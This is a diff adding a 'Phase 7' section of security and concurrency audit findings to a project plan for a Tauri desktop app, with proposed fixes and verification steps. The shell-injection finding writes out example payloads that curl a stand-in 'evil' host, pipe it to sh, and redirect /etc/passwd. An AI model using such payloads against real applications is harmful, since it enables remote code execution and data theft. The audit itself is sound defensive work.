@@ -265,3 +265,131 @@ End-to-end manual checks (per the README smoke matrix):
 
 `fix:` per Phase-1 item · `fix:` per Phase-2 item · `feat:` for 3.1–3.5 · `fix:`/`refactor:` for
 Phase 4 · `chore:`/`refactor:` for Phase 5. Verify locally before pushing per CLAUDE.md.
+
+---
+
+## Phase 7 — Full-scan findings (2026-06-26) — ⬜ TODO
+
+> Source: full project scan via 4 parallel audits (Rust backend, React stores, React components,
+> build/config). Baseline at scan time: `tsc --noEmit` exit 0 and `cargo check` clean — these are
+> **logic / security / concurrency** defects, not build breaks.
+> Tags: ✅ = verified by reading source during the scan · ⚠️ = audit-reported, mechanism plausible,
+> not independently line-traced. Fix the three verified criticals (7.1–7.3) first.
+
+### Critical
+
+**7.1 Shell injection across the renderer→Rust boundary in `pty.rs`.** ✅ `src-tauri/src/pty.rs:313–361`.
+Three frontend-controlled inputs are interpolated **unescaped** into a shell string run via
+`powershell -Command` / `bash -lc`:
+- `model_str` (336/338/341) — a `"` breaks out: `model = 'x"; curl evil/$(id); echo "'` → RCE.
+- `provider` passthrough (323) — `_ => provider` runs an arbitrary provider name verbatim as the
+  shell command (`ai_provider = "curl http://evil | sh"`).
+- `prompt_file` (338/348) — interpolated into `< "{}"` with no escaping and **no project
+  containment** (can redirect e.g. `/etc/passwd` into a provider CLI).
+
+Fix: drop the `_ => provider` fallthrough (allowlist providers only); pass `--model` / prompt file
+as `CommandBuilder` args instead of shell-interpolating; run `prompt_file` through the same
+project-containment check used elsewhere. Contradicts the CLAUDE.md "Rust is the path-contained
+trust boundary" rule, so this is in scope despite the renderer being app code.
+
+**7.2 Keychain accepts arbitrary `service` names.** ✅ `src-tauri/src/keychain.rs:5–14, 48–63`.
+`set_api_key` / `delete_api_key` pass `service` straight to `Entry::new(&service, …)` with no
+validation; the `saple_provider_<provider>_api_key` contract is not enforced. (Account is pinned to
+`saple_bridge_user`, so this can't reach *other apps'* OS secrets — defense-in-depth, not full
+takeover.) Fix: reject `service` not matching `^saple_provider_[a-z0-9_]+_api_key$`.
+
+**7.3 Within-project path traversal in `save_memory_node_inner`.** ✅ `src-tauri/src/memory.rs:646–728`.
+`clean_category`/`clean_id` only `.replace(' ', "-")` — they do **not** strip `/` or `..`, so
+`category = "a/../../.saple"` resolves back inside the project and passes the containment check,
+which compares against the **project root** (not the memory dir). Also `fs::create_dir_all(parent)`
+(722) runs **before** the check (725). Note: Phase 4.2 already fixed this for the *delete/read*
+paths but left the *save* path on the project-root base. Fix: reject `/`, `\`, `..` in category/id;
+canonicalize against the memory dir, mirroring 4.2.
+
+**7.4 Swarm can double-launch / leak agents.** ⚠️ `src/stores/swarmStore.ts`.
+- `checkAndRunNextAgents` (≈491–579) snapshots `activeAgents` then `await`s a save + recursive
+  call; a concurrent PTY-output `updateAgentStatus` re-enters with the same snapshot and launches
+  the same agent's PTY + prompt file twice (second terminal untracked).
+- `stopSwarm` (≈471–489) keeps `status:'running'` during the sequential `await removePane`
+  teardown, so a concurrent `[AGENT_DONE]` launches a new agent mid-shutdown, outside the kill list.
+
+Fix: re-entry guard / `launching` flag; set `swarmActive=false` **before** the teardown loop.
+
+### High
+
+**7.5 `agentSessionStore.saveSessions` bypasses write serialization.** ⚠️ `src/stores/agentSessionStore.ts:61–70`
+calls `invoke('write_project_file')` directly instead of the `enqueueWrite` queue kanban/swarm use;
+overlapping saves can reorder so a stale snapshot wins. Route through `enqueueWrite`.
+
+**7.6 Non-atomic writes to state files.** ✅ (inconsistency confirmed) `review.rs:85,157,202,219,243`
+and `project.rs:241` use bare `fs::write` for `tasks.json` / `sessions.json` / review records /
+initial config while the rest of the codebase uses `fs_lock::atomic_write`. A crash mid-write
+corrupts the file. Route them through `atomic_write` (extends the Phase 4.3 pass, which missed these).
+
+**7.7 Duplicate PTY id leaks a process + 3 threads.** ✅ `src-tauri/src/pty.rs:473` —
+`.insert(id, …)` overwrites an existing session without killing its child or reader/emitter/writer
+threads; `kill_pty(id)` then only reaps the survivor. Reject or kill-then-replace on duplicate id.
+
+**7.8 Production CSP ships dev-server origins.** ✅ `src-tauri/tauri.conf.json:23` `connect-src`
+includes `ws://localhost:1420` and `http://localhost:1420` (Vite devUrl) with no dev/prod split.
+Low blast radius (localhost connect-src only) but should be stripped from the release bundle via a
+`tauri.dev.conf.json` override.
+
+### Medium
+
+**7.9 Stale-write races on rapid interaction.** ⚠️ `memoryStore.ts:86–123` (`loadNote`) and
+`providerStore.ts:63–88` (`refreshReadiness`) have no request-currency guard, so an older async
+response can overwrite a newer one. Add a request-id / `activeNote` currency check before `set`.
+
+**7.10 Swarm `persist` has no `partialize`.** ⚠️ `src/stores/swarmStore.ts` persists full state
+(long system prompts, all templates) to localStorage; growth risks an uncaught `QuotaExceededError`
+that silently breaks persistence. Add `partialize` to persist only what's needed.
+
+**7.11 `terminalStore.outputListeners` not cleared in `removePane`.** ⚠️ `src/stores/terminalStore.ts:113,
+~641` deletes every per-pane map except `outputListeners`; on an error-boundary unmount (cleanup
+not run) the listener Set leaks. Delete the pane's `outputListeners` entry in `removePane`.
+
+### Low
+
+**7.12 Version drift.** ✅ `package.json` & `src-tauri/tauri.conf.json` = `1.0.6`, but
+`src-tauri/Cargo.toml:3` = `1.0.0`; `scripts/tauri.mjs:41–49` bumps the first two and never touches
+Cargo.toml. Add Cargo.toml to the bump loop; also replace scaffold metadata
+(`description = "A Tauri App"`, `authors = ["you"]`).
+
+**7.13 Build-script target handling.** ✅ `scripts/prepare-sidecar.mjs:24` only matches
+`--target=<triple>`; the space form `--target <triple>` silently falls back to host triple.
+`scripts/tauri.mjs:57` hardcodes `target/release/bundle`, wrong for cross-compiled `--target`
+builds. Parse both arg forms and compute `bundleDir` from the triple.
+
+**7.14 Committed build artifacts.** ✅ `vite.config.js` / `vite.config.d.ts` are emitted outputs in
+the repo root, not gitignored; `tsconfig.node.json` lacks `noEmit`. Add `noEmit`, gitignore the
+outputs.
+
+**7.15 React index-keys & effect-dep nits.** ⚠️ `SwarmGraph.tsx:167` uses `key={idx}` on edges
+(wrong stroke animations on reorder — use `${conn.from}-${conn.to}`); `ReviewWorkspace.tsx`
+recomputes `activeTask` each render inside effect deps, resetting reviewer state on background poll;
+`CommandPalette.tsx:118` uses a 100 ms `setTimeout` + `querySelector` to click a lazily-loaded tab
+(silent no-op on slow load — pass an initial-tab prop instead).
+
+**7.16 Unbounded growth.** ⚠️ `fs_lock.rs:24` lock map never pruned (also keyed on non-canonical
+path, so two spellings of one file get separate locks); `notificationStore` array uncapped;
+covered partly by 7.11. Cap/prune where they grow without bound.
+
+### Phase 7 verification (run after fixes)
+
+```powershell
+npm run typecheck            # exit 0
+npm run build                # tsc + vite
+cargo check --manifest-path src-tauri/Cargo.toml
+cd src-tauri; cargo test     # add traversal tests for 7.3 (mirror Phase 4.2)
+```
+
+Manual: confirm a non-allowlisted provider / a `"`-bearing model no longer reaches the shell (7.1);
+`set_api_key` with a non-`saple_provider_*` service is rejected (7.2); `save_memory_node` with
+`category` containing `..`/`/` is rejected (7.3); launching two swarm agents back-to-back spawns
+exactly one PTY each (7.4).
+
+### Suggested commits
+
+`fix:` per 7.1–7.3 (security, one focused commit each) · `fix:` 7.4–7.7 (concurrency/leaks) ·
+`fix:` 7.8 (CSP) · `fix:` 7.9–7.11 · `chore:`/`fix:` 7.12–7.16. Verify locally before pushing.
